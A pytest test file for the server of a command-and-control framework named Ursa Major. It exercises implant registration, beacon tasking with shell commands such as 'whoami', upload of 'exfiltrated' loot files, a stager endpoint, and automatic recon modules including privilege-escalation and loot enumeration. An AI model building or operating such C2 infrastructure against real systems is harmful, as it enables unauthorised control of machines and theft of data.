"""Tests for the Ursa Major C2 HTTP server."""

import base64
import json
import urllib.error
import urllib.request

from major.db import create_task, get_session, get_task, list_tasks, set_setting


def _post(host, port, path, data):
    """POST JSON to the test C2 server."""
    url = f"http://{host}:{port}{path}"
    body = json.dumps(data).encode()
    req = urllib.request.Request(url, data=body, method="POST")
    req.add_header("Content-Type", "application/json")
    try:
        resp = urllib.request.urlopen(req, timeout=5)
        return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as e:
        body = json.loads(e.read()) if e.fp else {}
        return e.code, body


def _get(host, port, path):
    """GET from the test C2 server."""
    url = f"http://{host}:{port}{path}"
    try:
        resp = urllib.request.urlopen(url, timeout=5)
        return resp.status, resp.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


class TestGetEndpoints:

    def test_root_returns_ok(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/")
        data = json.loads(body)
        assert status == 200
        assert data["status"] == "ok"

    def test_health_endpoint(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/health")
        data = json.loads(body)
        assert status == 200
        assert data["status"] == "healthy"

    def test_unknown_path_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _get(host, port, "/nonexistent")
        assert status == 404


class TestRegistration:

    def test_register_creates_session(self, c2_test_server):
        host, port = c2_test_server
        status, resp = _post(host, port, "/register", {
            "hostname": "VICTIM1",
            "username": "jdoe",
            "os": "Windows 10",
            "arch": "x64",
            "pid": 4444,
            "process": "explorer.exe",
        })
        assert status == 200
        assert "session_id" in resp
        assert "key" in resp
        assert len(resp["key"]) == 64

        session = get_session(resp["session_id"])
        assert session is not None
        assert session["hostname"] == "VICTIM1"
        assert session["username"] == "jdoe"

    def test_register_minimal_body(self, c2_test_server):
        host, port = c2_test_server
        status, resp = _post(host, port, "/register", {})
        assert status == 200
        assert "session_id" in resp


class TestBeacon:

    def _register(self, host, port):
        _, resp = _post(host, port, "/register", {"hostname": "BEACON_TEST"})
        return resp["session_id"]

    def test_beacon_returns_pending_tasks(self, c2_test_server):
        host, port = c2_test_server
        sid = self._register(host, port)
        tid = create_task(sid, "shell", {"command": "whoami"})

        status, resp = _post(host, port, "/beacon", {"session_id": sid})
        assert status == 200
        assert len(resp["tasks"]) == 1
        assert resp["tasks"][0]["type"] == "shell"
        assert resp["tasks"][0]["id"] == tid

    def test_beacon_empty_when_no_tasks(self, c2_test_server):
        host, port = c2_test_server
        sid = self._register(host, port)

        status, resp = _post(host, port, "/beacon", {"session_id": sid})
        assert status == 200
        assert resp["tasks"] == []

    def test_beacon_unknown_session_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/beacon", {"session_id": "INVALID1"})
        assert status == 404

    def test_beacon_missing_session_id_returns_400(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/beacon", {})
        assert status == 400


class TestResult:

    def test_submit_result(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "R1"})
        sid = reg["session_id"]
        tid = create_task(sid, "shell", {"command": "id"})

        status, resp = _post(host, port, "/result", {
            "session_id": sid,
            "task_id": tid,
            "result": "uid=0(root)",
            "error": "",
        })
        assert status == 200
        t = get_task(tid)
        assert t["status"] == "completed"
        assert t["result"] == "uid=0(root)"

    def test_result_missing_fields_returns_400(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _post(host, port, "/result", {})
        assert status == 400


class TestFileTransfer:

    def test_upload_and_download(self, c2_test_server):
        host, port = c2_test_server
        _, reg = _post(host, port, "/register", {"hostname": "FT1"})
        sid = reg["session_id"]

        file_data = b"exfiltrated secrets"
        status, resp = _post(host, port, "/upload", {
            "session_id": sid,
            "filename": "loot.txt",
            "data": base64.b64encode(file_data).decode(),
        })
        assert status == 200
        fid = resp["file_id"]

        status, body = _get(host, port, f"/download/{fid}")
        assert status == 200
        assert body == file_data

    def test_download_nonexistent_returns_404(self, c2_test_server):
        host, port = c2_test_server
        status, _ = _get(host, port, "/download/NOPE1234")
        assert status == 404


class TestStageEndpoint:

    def test_stage_serves_stager(self, c2_test_server):
        host, port = c2_test_server
        status, body = _get(host, port, "/stage")
        assert status == 200
        assert len(body) > 0


class TestAutoRecon:
    """Auto-recon: queue initial recon sequence on new session registration."""

    def _register(self, host, port, hostname="RECON1"):
        _, resp = _post(host, port, "/register", {"hostname": hostname, "username": "op"})
        return resp["session_id"]

    # ── disabled (default) ────────────────────────────────────────────────────

    def test_no_auto_recon_tasks_when_disabled(self, c2_test_server, tmp_db):
        """Default: auto-recon is off — no tasks queued on registration."""
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert tasks == [], "Expected zero tasks when auto-recon is disabled"

    def test_beacon_returns_no_tasks_when_disabled(self, c2_test_server, tmp_db):
        """Beacon check-in with no auto-recon yields empty task list."""
        host, port = c2_test_server
        sid = self._register(host, port)
        _, beacon_resp = _post(host, port, "/beacon", {"session_id": sid})
        assert beacon_resp.get("tasks", []) == []

    # ── enabled ───────────────────────────────────────────────────────────────

    def test_auto_recon_queues_tasks_when_enabled(self, c2_test_server, tmp_db):
        """Enable auto-recon → tasks queued immediately on registration."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert len(tasks) > 0, "Expected auto-recon tasks to be queued"

    def test_auto_recon_queues_default_module_count(self, c2_test_server, tmp_db):
        """Default module list has 5 entries: sysinfo, users, privesc, network, loot."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert len(tasks) == 5

    def test_auto_recon_tasks_are_type_post(self, c2_test_server, tmp_db):
        """All auto-recon tasks must be of type 'post'."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert all(t["task_type"] == "post" for t in tasks)

    def test_auto_recon_task_args_contain_module_and_code(self, c2_test_server, tmp_db):
        """Each auto-recon task args must include 'module' and 'code'."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        for t in tasks:
            args = json.loads(t["args"]) if isinstance(t["args"], str) else t["args"]
            assert "module" in args, f"Missing 'module' in args: {args}"
            assert "code"   in args, f"Missing 'code'   in args: {args}"

    def test_auto_recon_module_order(self, c2_test_server, tmp_db):
        """Tasks queued in the expected order: sysinfo → users → privesc → network → loot."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        # list_tasks returns DESC; sort ASC by created_at to get insertion order
        tasks = sorted(list_tasks(session_id=sid), key=lambda t: t["created_at"])
        modules = [
            json.loads(t["args"])["module"]
            if isinstance(t["args"], str)
            else t["args"]["module"]
            for t in tasks
        ]
        assert modules == [
            "enum/sysinfo",
            "enum/users",
            "enum/privesc",
            "enum/network",
            "enum/loot",
        ]

    def test_auto_recon_custom_module_list(self, c2_test_server, tmp_db):
        """Custom module list is respected when set via DB settings."""
        custom = ["enum/sysinfo", "enum/network"]
        set_setting("auto_recon.enabled", True)
        set_setting("auto_recon.modules", custom)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = sorted(list_tasks(session_id=sid), key=lambda t: t["created_at"])
        assert len(tasks) == 2
        modules = [
            json.loads(t["args"])["module"]
            if isinstance(t["args"], str)
            else t["args"]["module"]
            for t in tasks
        ]
        assert modules == custom

    def test_auto_recon_tasks_start_pending(self, c2_test_server, tmp_db):
        """Auto-recon tasks are initially in 'pending' state."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert all(t["status"] == "pending" for t in tasks)

    def test_auto_recon_beacon_delivers_tasks(self, c2_test_server, tmp_db):
        """First beacon check-in after registration receives all queued tasks."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid = self._register(host, port)
        _, beacon_resp = _post(host, port, "/beacon", {"session_id": sid})
        delivered = beacon_resp.get("tasks", [])
        assert len(delivered) == 5
        assert all(t["type"] == "post" for t in delivered)

    def test_disable_setting_overrides_enable(self, c2_test_server, tmp_db):
        """Explicitly disabling (set False) suppresses auto-recon even if config default were True."""
        set_setting("auto_recon.enabled", False)
        host, port = c2_test_server
        sid = self._register(host, port)
        tasks = list_tasks(session_id=sid)
        assert tasks == []

    def test_multiple_sessions_each_get_own_tasks(self, c2_test_server, tmp_db):
        """Each new session gets its own independent auto-recon task set."""
        set_setting("auto_recon.enabled", True)
        host, port = c2_test_server
        sid1 = self._register(host, port, hostname="HOST1")
        sid2 = self._register(host, port, hostname="HOST2")
        tasks1 = list_tasks(session_id=sid1)
        tasks2 = list_tasks(session_id=sid2)
        assert len(tasks1) == 5
        assert len(tasks2) == 5
        # Tasks are independent — different task IDs
        ids1 = {t["id"] for t in tasks1}
        ids2 = {t["id"] for t in tasks2}
        assert ids1.isdisjoint(ids2)
